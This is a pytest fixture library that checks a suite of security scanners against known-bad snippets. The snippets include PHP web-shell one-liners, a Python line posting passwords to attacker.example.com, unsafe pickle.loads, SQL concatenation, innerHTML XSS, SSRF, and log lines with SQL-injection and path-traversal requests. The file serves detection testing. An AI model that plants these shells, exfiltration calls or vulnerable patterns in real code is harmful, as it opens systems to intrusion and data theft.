"""
L5 Compliance Tests — Security Scanner Ground-Truth Fixture Library.

Each test class writes a known-bad code snippet to a temp file, runs the
relevant scanner, and asserts that at least one finding of CRITICAL or HIGH
severity is produced.  If any of these tests fail, the scanner's pattern
logic is broken.
"""

from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# ReDoS
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.ReDoS.services.redos_scanner import ReDoSScanner
from Asgard.Heimdall.Security.ReDoS.models.redos_models import ReDoSScanConfig

# ---------------------------------------------------------------------------
# API Security
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.API.services.api_scanner import APISecurityScanner
from Asgard.Heimdall.Security.API.models.api_models import APIScanConfig

# ---------------------------------------------------------------------------
# Backdoor
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Backdoor.services.backdoor_detector import BackdoorDetector
from Asgard.Heimdall.Security.Backdoor.models.backdoor_models import BackdoorScanConfig

# ---------------------------------------------------------------------------
# Data Exfiltration
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.DataExfil.services.data_exfil_detector import DataExfiltrationDetector
from Asgard.Heimdall.Security.DataExfil.models.data_exfil_models import ExfilScanConfig

# ---------------------------------------------------------------------------
# Deserialization
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Deserialization.services.deserialization_scanner import DeserializationScanner
from Asgard.Heimdall.Security.Deserialization.models.deserialization_models import DeserializationScanConfig

# ---------------------------------------------------------------------------
# Frontend Security
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Frontend.services.frontend_scanner import FrontendSecurityScanner
from Asgard.Heimdall.Security.Frontend.models.frontend_models import FrontendScanConfig

# ---------------------------------------------------------------------------
# Malware
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Malware.services.malware_scanner import MalwareScanner
from Asgard.Heimdall.Security.Malware.models.malware_models import MalwareScanConfig

# ---------------------------------------------------------------------------
# Security Misconfiguration
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Misconfig.services.misconfig_scanner import SecurityMisconfigScanner
from Asgard.Heimdall.Security.Misconfig.models.misconfig_models import MisconfigScanConfig

# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.PathTraversal.services.path_traversal_scanner import PathTraversalScanner
from Asgard.Heimdall.Security.PathTraversal.models.path_traversal_models import PathTraversalScanConfig

# ---------------------------------------------------------------------------
# Race Condition
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.RaceCondition.services.race_condition_detector import RaceConditionDetector
from Asgard.Heimdall.Security.RaceCondition.models.race_condition_models import RaceConditionScanConfig

# ---------------------------------------------------------------------------
# Sensitive Data
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.SensitiveData.services.sensitive_data_scanner import SensitiveDataScanner
from Asgard.Heimdall.Security.SensitiveData.models.sensitive_data_models import SensitiveDataScanConfig

# ---------------------------------------------------------------------------
# SSRF / XXE
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.SSRF.services.ssrf_scanner import SSRFXXEScanner
from Asgard.Heimdall.Security.SSRF.models.ssrf_models import SSRFScanConfig

# ---------------------------------------------------------------------------
# Input Validation
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.InputValidation.services.input_validation_scanner import InputValidationScanner
from Asgard.Heimdall.Security.InputValidation.models.input_validation_models import InputValidationScanConfig

# ---------------------------------------------------------------------------
# Info Disclosure
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.InfoDisclosure.services.info_disclosure_scanner import InfoDisclosureScanner
from Asgard.Heimdall.Security.InfoDisclosure.models.info_disclosure_models import InfoDisclosureScanConfig

# ---------------------------------------------------------------------------
# Git Security
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.Git.services.git_scanner import GitSecurityScanner

# ---------------------------------------------------------------------------
# File Integrity
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.FileIntegrity.services.file_integrity_checker import FileIntegrityChecker

# ---------------------------------------------------------------------------
# Log Analysis
# ---------------------------------------------------------------------------
from Asgard.Heimdall.Security.LogAnalysis.services.log_analyzer import LogAnalyzer

# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------
_HIGH_OR_CRITICAL = {"CRITICAL", "HIGH"}


def _has_critical_or_high(findings) -> bool:
    return any(
        getattr(f.severity, "value", str(f.severity)) in _HIGH_OR_CRITICAL
        for f in findings
    )


# ===========================================================================
# ReDoS
# ===========================================================================
class TestReDoSScannerCompliance:
    """Known-bad: nested quantifiers (a+)+ causes catastrophic backtracking."""

    BAD_CODE = """\
import re

# Catastrophically vulnerable pattern
pattern = re.compile(r'(a+)+')
data = "aaaaaaaaaaaaa!"
result = pattern.match(data)
"""

    def test_detects_nested_quantifiers(self, tmp_path: Path) -> None:
        target = tmp_path / "vuln.py"
        target.write_text(self.BAD_CODE)
        config = ReDoSScanConfig(scan_path=target)
        report = ReDoSScanner().scan(config)
        assert report.total_findings > 0, "ReDoS scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# API Security
# ===========================================================================
class TestAPISecurityScannerCompliance:
    """Known-bad: direct object reference and IDOR patterns in a JS API file."""

    BAD_CODE = """\
const express = require('express');
const router = express.Router();

// IDOR: reading user from DB using caller-supplied ID
router.get('/user/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(user);
});

// Privilege escalation: role from request body
router.post('/promote', (req, res) => {
    const role = req.body.role;
    user.save();
});
"""

    def test_detects_idor_and_data_exposure(self, tmp_path: Path) -> None:
        target = tmp_path / "api_router.js"
        target.write_text(self.BAD_CODE)
        config = APIScanConfig(scan_path=target)
        report = APISecurityScanner().scan(config)
        assert report.total_findings > 0, "API scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Backdoor Detector
# ===========================================================================
class TestBackdoorDetectorCompliance:
    """Known-bad: classic PHP web-shell one-liner."""

    BAD_CODE = "<?php eval(base64_decode($_GET['cmd'])); ?>"

    def test_detects_php_webshell(self, tmp_path: Path) -> None:
        target = tmp_path / "shell.php"
        target.write_text(self.BAD_CODE)
        config = BackdoorScanConfig(scan_path=target)
        report = BackdoorDetector().scan(config)
        assert report.total_findings > 0, "Backdoor detector produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Data Exfiltration
# ===========================================================================
class TestDataExfiltrationDetectorCompliance:
    """Known-bad: HTTP POST exfiltrating a password field."""

    BAD_CODE = """\
import requests

def send_creds(pw):
    url = "https://attacker.example.com/collect"
    requests.post(url, data={'password': pw, 'secret': pw})
"""

    def test_detects_http_password_exfil(self, tmp_path: Path) -> None:
        target = tmp_path / "exfil.py"
        target.write_text(self.BAD_CODE)
        config = ExfilScanConfig(scan_path=target)
        report = DataExfiltrationDetector().scan(config)
        assert report.total_findings > 0, "DataExfil detector produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Deserialization
# ===========================================================================
class TestDeserializationScannerCompliance:
    """Known-bad: pickle.loads from untrusted user_data."""

    BAD_CODE = """\
import pickle

def deserialize(user_data):
    obj = pickle.loads(user_data)
    return obj
"""

    def test_detects_pickle_loads(self, tmp_path: Path) -> None:
        target = tmp_path / "deser.py"
        target.write_text(self.BAD_CODE)
        config = DeserializationScanConfig(scan_path=target)
        report = DeserializationScanner().scan(config)
        assert report.total_findings > 0, "Deserialization scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Frontend Security
# ===========================================================================
class TestFrontendSecurityScannerCompliance:
    """Known-bad: innerHTML assignment with user-supplied data."""

    BAD_CODE = """\
function render(userInput) {
    const el = document.getElementById('content');
    el.innerHTML = userInput;
}
"""

    def test_detects_innerhtml_xss(self, tmp_path: Path) -> None:
        target = tmp_path / "app.js"
        target.write_text(self.BAD_CODE)
        config = FrontendScanConfig(scan_path=target)
        report = FrontendSecurityScanner().scan(config)
        assert report.total_findings > 0, "Frontend scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Malware
# ===========================================================================
class TestMalwareScannerCompliance:
    """Known-bad: PHP eval with base64-decoded command — web shell pattern."""

    BAD_CODE = "<?php eval(base64_decode($_POST['cmd'])); ?>"

    def test_detects_webshell_pattern(self, tmp_path: Path) -> None:
        target = tmp_path / "backdoor.php"
        target.write_text(self.BAD_CODE)
        config = MalwareScanConfig(scan_path=target)
        report = MalwareScanner().scan(config)
        assert report.total_findings > 0, "Malware scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Security Misconfiguration
# ===========================================================================
class TestSecurityMisconfigScannerCompliance:
    """Known-bad: Django-style settings file with DEBUG=True and weak SECRET_KEY."""

    BAD_CODE = """\
DEBUG = True
SECRET_KEY = "dev"
ALLOWED_HOSTS = ['*']
"""

    def test_detects_debug_and_weak_secret(self, tmp_path: Path) -> None:
        target = tmp_path / "settings.py"
        target.write_text(self.BAD_CODE)
        config = MisconfigScanConfig(scan_path=target)
        report = SecurityMisconfigScanner().scan(config)
        assert report.total_findings > 0, "Misconfig scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Path Traversal
# ===========================================================================
class TestPathTraversalScannerCompliance:
    """Known-bad: file open with user-controlled path from request args."""

    # Pattern: open(request.args.get(...)) — triggers open_user_input CRITICAL
    BAD_CODE = """\
from flask import request

def download():
    filename = request.args.get('file')
    with open(request.args.file) as f:
        return f.read()
"""

    def test_detects_open_with_user_input(self, tmp_path: Path) -> None:
        target = tmp_path / "handler.py"
        target.write_text(self.BAD_CODE)
        config = PathTraversalScanConfig(scan_path=target)
        report = PathTraversalScanner().scan(config)
        assert report.total_findings > 0, "PathTraversal scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Race Condition
# ===========================================================================
class TestRaceConditionDetectorCompliance:
    """Known-bad: os.access() TOCTOU check-then-use pattern."""

    BAD_CODE = """\
import os

def process_file(path):
    if os.access(path, os.R_OK):
        with open(path) as f:
            return f.read()
"""

    def test_detects_toctou_access(self, tmp_path: Path) -> None:
        target = tmp_path / "toctou.py"
        target.write_text(self.BAD_CODE)
        config = RaceConditionScanConfig(scan_path=target)
        report = RaceConditionDetector().scan(config)
        assert report.total_findings > 0, "RaceCondition detector produced no findings"
        # Plan 07.7 (precision-first TOCTOU): severity is capped at
        # LOW/MEDIUM and findings are never gate-blocking -- exploitability
        # depends on runtime scheduling a static pass cannot observe, so
        # CRITICAL/HIGH would be an overclaim. This intentionally
        # supersedes the pre-uplift regex scanner's HIGH severity for this
        # pattern.
        assert all(f.severity in ("LOW", "MEDIUM") for f in report.findings), (
            f"Expected LOW/MEDIUM severity (never gate-blocking), got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Sensitive Data
# ===========================================================================
class TestSensitiveDataScannerCompliance:
    """Known-bad: plaintext password hardcoded in source."""

    BAD_CODE = """\
# Database credentials
password = "SuperSecret123"
api_key = "AKIAIOSFODNN7EXAMPLE1234"
"""

    def test_detects_hardcoded_password_and_key(self, tmp_path: Path) -> None:
        target = tmp_path / "config.py"
        target.write_text(self.BAD_CODE)
        config = SensitiveDataScanConfig(scan_path=target)
        report = SensitiveDataScanner().scan(config)
        assert report.total_findings > 0, "SensitiveData scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# SSRF / XXE
# ===========================================================================
class TestSSRFXXEScannerCompliance:
    """Known-bad: PHP file_get_contents with user-supplied URL."""

    BAD_CODE = "<?php echo file_get_contents($_GET['url']); ?>"

    def test_detects_ssrf_php(self, tmp_path: Path) -> None:
        target = tmp_path / "proxy.php"
        target.write_text(self.BAD_CODE)
        config = SSRFScanConfig(scan_path=target)
        report = SSRFXXEScanner().scan(config)
        assert report.total_findings > 0, "SSRF scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Input Validation
# ===========================================================================
class TestInputValidationScannerCompliance:
    """Known-bad: SQL string concatenation with req.params input."""

    BAD_CODE = """\
const express = require('express');
const router = express.Router();

router.get('/search', async (req, res) => {
    const results = await db.query("SELECT * FROM users WHERE name = '" + req.params.name + "'");
    res.json(results);
});
"""

    def test_detects_sql_string_concat(self, tmp_path: Path) -> None:
        target = tmp_path / "search_route.js"
        target.write_text(self.BAD_CODE)
        config = InputValidationScanConfig(scan_path=target)
        report = InputValidationScanner().scan(config)
        assert report.total_findings > 0, "InputValidation scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Info Disclosure
# ===========================================================================
class TestInfoDisclosureScannerCompliance:
    """Known-bad: stack trace exposed in HTTP response (same line — triggers pattern)."""

    # The scanner pattern is: stack.*(?:res\.|response\.) — both tokens must be on the same line.
    BAD_CODE = """\
const express = require('express');
const app = express();

app.use((err, req, res, next) => {
    res.json({ error: err.stack, stack: err.stack, trace: res.stack });
    catch(e) { res.send(e) }
});
"""

    def test_detects_stack_trace_in_response(self, tmp_path: Path) -> None:
        target = tmp_path / "error_handler.js"
        target.write_text(self.BAD_CODE)
        config = InfoDisclosureScanConfig(scan_path=target)
        report = InfoDisclosureScanner().scan(config)
        assert report.total_findings > 0, "InfoDisclosure scanner produced no findings"
        assert _has_critical_or_high(report.findings), (
            f"Expected CRITICAL/HIGH severity, got: {[f.severity for f in report.findings]}"
        )


# ===========================================================================
# Git Security
# ===========================================================================
class TestGitSecurityScannerCompliance:
    """Known-bad: git repo with missing .gitignore patterns triggers MEDIUM findings,
    and missing pre-commit hook triggers LOW finding.  We confirm total_findings > 0."""

    def test_detects_gitignore_and_hook_issues(self, tmp_path: Path) -> None:
        # Set up a minimal git repo (no commits needed — scanner checks .gitignore and hooks dir)
        import subprocess
        repo = tmp_path / "myrepo"
        repo.mkdir()
        subprocess.run(["git", "init", str(repo)], capture_output=True)
        subprocess.run(["git", "-C", str(repo), "config", "user.email", "t@t.com"], capture_output=True)
        subprocess.run(["git", "-C", str(repo), "config", "user.name", "T"], capture_output=True)

        # Write a Python file with a hardcoded password so _check_secrets_in_current_files fires
        bad_py = repo / "app.py"
        bad_py.write_text("password = 'SuperSecret123!'\n")

        # Create an empty .gitignore (missing all essential patterns)
        (repo / ".gitignore").write_text("# nothing\n")

        # Commit so HEAD exists
        subprocess.run(["git", "-C", str(repo), "add", "."], capture_output=True)
        subprocess.run(
            ["git", "-C", str(repo), "commit", "-m", "init", "--no-gpg-sign"],
            capture_output=True,
        )

        scanner = GitSecurityScanner()
        report = scanner.scan(repo)
        assert report.total_findings > 0, (
            f"Git scanner produced no findings (by_type={report.by_type})"
        )


# ===========================================================================
# File Integrity
# ===========================================================================
class TestFileIntegrityCheckerCompliance:
    """Known-bad: a file is modified after baseline, producing a 'modified' finding."""

    def test_detects_modified_file(self, tmp_path: Path) -> None:
        target_file = tmp_path / "secret.txt"
        target_file.write_text("original content\n")

        baseline_path = tmp_path / "baseline.json"
        checker = FileIntegrityChecker(baseline_file=str(baseline_path))
        checker.create_baseline(tmp_path)

        # Tamper with the file
        target_file.write_text("TAMPERED content — attacker was here\n")

        report = checker.verify_integrity(tmp_path)
        assert report.has_changes, "FileIntegrity checker did not detect tampered file"
        assert len(report.modified) > 0, (
            f"Expected modified entries, got: modified={report.modified}, added={report.added}"
        )


# ===========================================================================
# Log Analysis
# ===========================================================================
class TestLogAnalyzerCompliance:
    """Known-bad: log file containing SQL injection and brute-force patterns."""

    BAD_LOG = """\
2024-01-15 10:23:01 192.168.1.50 GET /search?q=1' UNION SELECT * FROM users-- HTTP/1.1 200
2024-01-15 10:23:02 192.168.1.50 POST /login failed password for admin from 192.168.1.50
2024-01-15 10:23:03 192.168.1.50 too many authentication failures — account locked
2024-01-15 10:23:04 10.0.0.1 GET /../../../etc/passwd HTTP/1.1 404
"""

    def test_detects_sql_injection_and_brute_force(self, tmp_path: Path) -> None:
        log_file = tmp_path / "access.log"
        log_file.write_text(self.BAD_LOG)

        analyzer = LogAnalyzer()
        report = analyzer.analyze_file(log_file)
        assert report.total_events > 0, "LogAnalyzer produced no events from known-bad log"
        high_or_critical = {"CRITICAL", "HIGH"}
        assert any(
            e.severity in high_or_critical for e in report.events
        ), f"No HIGH/CRITICAL events found; by_severity={report.by_severity}"
